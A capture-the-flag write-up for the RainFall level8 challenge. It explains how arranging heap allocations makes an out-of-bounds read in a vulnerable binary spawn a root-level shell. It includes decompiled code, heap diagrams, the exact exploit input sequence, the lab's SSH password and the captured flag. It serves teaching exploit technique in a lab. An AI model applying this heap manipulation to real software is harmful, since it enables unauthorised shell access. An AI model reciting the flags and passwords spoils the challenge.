# 🎯 Level8 - Heap Layout Manipulation via Out-of-Bounds Read

![Helldivers Victory](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExb2V6MjFua3VrNnBzZDR6b3M5eHN4M3BhcmEwZGZ3OGJlZHJvYzE5ZSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/xUA7aSnNyCHNJqcHS8/giphy.gif)

Strategic heap placement - control what the program reads! 🔥

## 📋 Binary Analysis

### 🎯 Main Function (Simplified Logic)

```c
char *auth = NULL;     // Global pointer
char *service = NULL;  // Global pointer

int main(void)
{
    char buffer[128];
    
    while (1)
    {
        printf("%p, %p \n", auth, service);
        
        if (fgets(buffer, 128, stdin) == NULL)
            return 0;
        
        // Command: "auth <arg>"
        if (strncmp(buffer, "auth ", 5) == 0)
        {
            auth = malloc(4);                    // ⚠️ Only 4 bytes!
            auth[0] = '\0';
            
            if (strlen(buffer + 5) < 30)
            {
                strcpy(auth, buffer + 5);        // Copy argument
            }
        }
        
        // Command: "reset"
        if (strncmp(buffer, "reset", 5) == 0)
        {
            free(auth);
        }
        
        // Command: "service<arg>"
        if (strncmp(buffer, "service", 7) == 0)
        {
            service = strdup(buffer + 8);        // Allocate on heap
        }
        
        // Command: "login"
        if (strncmp(buffer, "login", 5) == 0)
        {
            if (*(int *)(auth + 32) == 0)        // 🎯 Read 32 bytes past auth!
            {
                fwrite("Password:\n", 1, 10, stdout);
            }
            else
            {
                system("/bin/sh");               // 🚩 Shell access!
            }
        }
    }
    
    return 0;
}
```

### 🔑 Key Addresses

| Element | Address | Notes |
|---------|---------|-------|
| **Global `auth`** | `0x08049aac` | Pointer stored in .bss |
| **Global `service`** | `0x08049ab0` | Pointer stored in .bss |
| **auth heap** | `0x0804a008` | 4-byte allocation (runtime) |
| **service heap** | `0x0804a018` | Variable size (runtime) |

**Key Observations:**
- Program implements a **command-line interface** with 4 commands
- auth is allocated only **4 bytes** via `malloc(4)`
- login checks **32 bytes past** auth pointer (`auth + 0x20`)
- This is an **out-of-bounds read** - reading beyond allocated memory
- service uses `strdup()` which allocates memory on the heap

## 🚨 The Challenge

This is our first **heap layout manipulation** exploit - we don't overflow to overwrite, we arrange heap allocations so the program's buggy read lands exactly where we want.

**The Setup:**
```c
auth = malloc(4);              // Allocates 4 bytes on heap
service = strdup("AAAA...");   // Allocates adjacent chunk on heap

// Later...
if (*(int *)(auth + 32) == 0)  // Reads 32 bytes PAST auth!
```

**The Problem:**
- auth points to only 4 bytes of allocated memory
- login checks the value 32 bytes past auth
- Reading beyond allocated memory = **out-of-bounds read**
- What does it read? **Undefined - could be anything!**

**The Goal:**
Arrange heap allocations so that `auth + 32` reads into the `service` buffer, which we control!

## 🎯 How the Exploit Works

### Understanding the Out-of-Bounds Read

**What is an Out-of-Bounds Read?**
- Accessing memory outside an allocated region
- Unlike overflow (writing OOB), this **reads** OOB
- The program doesn't know it's reading garbage/unintended data
- If we control what it reads → we control the outcome

**The Vulnerable Check:**
```c
if (*(int *)(auth + 32) == 0) {
    fwrite("Password:\n", 1, 10, stdout);  // Failed login
}
else {
    system("/bin/sh");                    // Success!
}
```

To get a shell, we need `*(auth + 32)` to be **non-zero**. But how do we control what's 32 bytes past auth?

### Heap Allocation Behavior

**Sequential Allocation:**

When you call `malloc()` multiple times, the allocator places chunks **consecutively** on the heap:

```
First malloc(4):
┌─────────────────┐
│ Chunk 1         │
└─────────────────┘

Second malloc(N):
┌─────────────────┬─────────────────┐
│ Chunk 1         │ Chunk 2         │
└─────────────────┴─────────────────┘
```

Each chunk includes hidden metadata (size, flags) managed by the allocator.

### Heap Layout Discovery

Using `ltrace` to see actual addresses:

```bash
$ ltrace ./level8
...
printf("%p, %p \n", nil, nil)
auth AAAA
malloc(4)  = 0x0804a008  ← auth allocated here
...
service BBBBBBBBBBBBBBBB
strdup("BBBBBBBBBBBBBBBB")
malloc(17) = 0x0804a018  ← service allocated here (16 bytes after!)
...
```

**Distance calculation:**
```
service - auth = 0x0804a018 - 0x0804a008 = 0x10 = 16 bytes
```

### Visual: Heap Memory Layout

```
AFTER auth = malloc(4):
════════════════════════════════════════════════════════════════
0x0804a000: ┌──────────────────────────────────────────────┐
            │ [8-byte malloc header]                       │
0x0804a008: │ [4 bytes data] ← auth points here            │
            │ [4 bytes padding]                            │
0x0804a010: └──────────────────────────────────────────────┘
            
            Next chunk will start here!


AFTER service = strdup("BBBBBBBBBBBBBBBB"):
════════════════════════════════════════════════════════════════
0x0804a000: ┌──────────────────────────────────────────────┐
            │ [8-byte malloc header for auth]              │
0x0804a008: │ "AAAA" ← auth points here                    │
            │ [padding]                                    │
            ├──────────────────────────────────────────────┤
0x0804a010: │ [8-byte malloc header for service]           │
0x0804a018: │ "BBBBBBBBBBBBBBBB\0" ← service points here   │
            │  ↑                                           │
            │  │                                           │
            │  │ (16 bytes into buffer)                   │
            │  │                                           │
0x0804a028: │  └─────────────────────  ← auth+32 reads HERE!│
            │                                              │
            └──────────────────────────────────────────────┘
```

### The Attack Strategy

**Step 1: Allocate auth**

Command: `auth AAAA`
```c
auth = malloc(4);  // Allocates at 0x0804a008
strcpy(auth, "AAAA");
```

Heap state:
```
0x0804a008: "AAAA" (4 bytes)
```

**Step 2: Allocate service with ≥16 bytes**

Command: `service BBBBBBBBBBBBBBBB` (16+ bytes)
```c
service = strdup("BBBBBBBBBBBBBBBB");  // Allocates at 0x0804a018
```

Heap state:
```
0x0804a008: "AAAA" (auth)
0x0804a018: "BBBBBBBBBBBBBBBB" (service)
```

**Step 3: Trigger the check**

Command: `login`
```c
if (*(int *)(auth + 32) == 0)  // Checks 0x0804a008 + 0x20 = 0x0804a028
```

Where is `0x0804a028`?
```
auth    = 0x0804a008
service = 0x0804a018
target  = 0x0804a028 = service + 0x10 (16 bytes into service!)
```

The check reads the **16th byte** of the service buffer!

**Step 4: Result**

Since service contains "BBBBBBBBBBBBBBBB", the 16th byte is 'B' (0x42), which is **non-zero**!
- Check: `*(auth + 32) == 0` → FALSE (it's 0x42424242)
- Else branch executes: `system("/bin/sh")`
- **Shell spawned!** 🎉

### Calculating Minimum Service Length

To make `auth + 32` land inside service:

```
auth allocated at:     0x0804a008
service allocated at:  0x0804a018  (16 bytes later due to malloc overhead)
auth + 32 points to:   0x0804a028

Offset into service:
0x0804a028 - 0x0804a018 = 0x10 = 16 bytes
```

**Therefore: service must be ≥ 16 bytes long!**

If service were shorter than 16 bytes:
- `auth + 32` would read **unallocated memory**
- Likely contains zeros → check passes → no shell
- Could segfault if the address is unmapped

### Complete Execution Flow

```
Step 1: Program Start
─────────────────────
./level8
(nil), (nil)  ← Both pointers initially NULL


Step 2: Allocate auth
─────────────────────
Command: auth AAAA

malloc(4) returns 0x0804a008
auth = 0x0804a008
strcpy(auth, "AAAA")

Heap:
  0x0804a008: "AAAA"
  
Output: 0x804a008, (nil)


Step 3: Allocate service
────────────────────────
Command: service BBBBBBBBBBBBBBBB

strdup() calls malloc(17) for 16 chars + null
malloc(17) returns 0x0804a018
service = 0x0804a018
Copies "BBBBBBBBBBBBBBBB\0"

Heap:
  0x0804a008: "AAAA"        ← auth
  0x0804a018: "BBBBBBBB..." ← service

Output: 0x804a008, 0x804a018


Step 4: Login attempt
─────────────────────
Command: login

Check: *(int *)(auth + 32) == 0
       *(int *)(0x0804a008 + 0x20) == 0
       *(int *)(0x0804a028) == 0

Reading at 0x0804a028:
  - This is 16 bytes into service buffer
  - Contains: 'B''B''B''B' = 0x42424242
  - Result: 0x42424242 ≠ 0

Condition is FALSE → else branch executes
system("/bin/sh")


Step 5: Shell Access! 🎉
─────────────────────────
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

### Why This Works

| Requirement | Status | Explanation |
|-------------|--------|-------------|
| **Predictable heap** | ✅ | malloc() allocates sequentially in simple programs |
| **Known offset** | ✅ | Chunks are 16 bytes apart (4-byte alloc + metadata) |
| **OOB read** | ✅ | Program reads auth + 32 without validation |
| **Control data** | ✅ | We control service buffer contents |
| **Correct alignment** | ✅ | Service is exactly 16 bytes after auth |
| **Sufficient length** | ✅ | Service ≥ 16 bytes so auth+32 lands in it |
| **Non-zero data** | ✅ | Service contains printable chars (all non-zero) |

### Key Insight

**Exploit Evolution - New Technique:**

Previous levels focused on **overwriting** memory:
- Stack overflow → overwrite return address
- Format string → overwrite GOT entries
- Heap overflow → overwrite function pointers

Level8 introduces **heap layout manipulation**:
- We don't overflow anything
- We don't overwrite any data
- We simply **arrange allocations** so the program's buggy read lands where we want
- This is called "**heap feng shui**" - positioning heap chunks strategically

**Why this matters:**
- Works even when you can't overflow (strict length checks)
- Bypasses canaries and stack cookies (we're not on the stack!)
- Demonstrates advanced understanding of memory layout
- Common in real-world exploits (heap spraying, heap grooming)

## 💣 Execute the Exploit

Connect to the VM:

```bash
ssh level8@localhost -p 2222
# Password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

Run the exploit:

```bash
level8@RainFall:~$ ./level8
(nil), (nil)
auth AAAA
0x804a008, (nil)
service BBBBBBBBBBBBBBBB
0x804a008, 0x804a018
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

**Expected behavior:**
1. First line shows both pointers as NULL
2. After `auth`, only auth is allocated
3. After `service`, both are allocated **16 bytes apart**
4. After `login`, shell spawns!

---

> 💡 **Pro Tip**: Heap layout manipulation (heap feng shui) is about controlling the **relative positions** of allocations. Even with ASLR randomizing absolute addresses, relative offsets often remain predictable!

> ⚠️ **Security Note**: Modern protections against heap manipulation:
> - **Heap randomization** - Randomizes allocation order and spacing
> - **Guard pages** - Places unmapped pages between allocations
> - **Metadata encryption** - Encrypts malloc metadata to prevent corruption
> - **Safe allocators** - Use allocators that validate size/bounds
> 
> **Safe coding practices:**
> - Always validate array bounds before access
> - Use `malloc_usable_size()` to check actual allocation size
> - Implement bounds checking even for read operations
> - Consider using safe memory allocators (jemalloc, tcmalloc)

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
